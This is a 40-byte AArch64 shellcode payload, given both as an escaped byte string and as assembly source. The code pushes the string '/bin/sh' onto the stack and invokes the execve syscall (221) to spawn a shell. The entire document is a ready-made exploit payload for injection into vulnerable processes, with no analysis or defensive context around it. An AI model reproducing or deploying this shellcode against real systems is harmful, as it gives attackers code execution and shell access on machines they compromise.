// AArch64 (LE) Shellcode / 40 bytes
// "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe0\x63\x3f\x8b\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\xe1\x61\x01\xd4"


.global _start
_start:
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]!
    add x0, sp, xzr
    mov  x1, xzr
    mov  x2, xzr
    mov  x8, #221
    svc #0xb0f
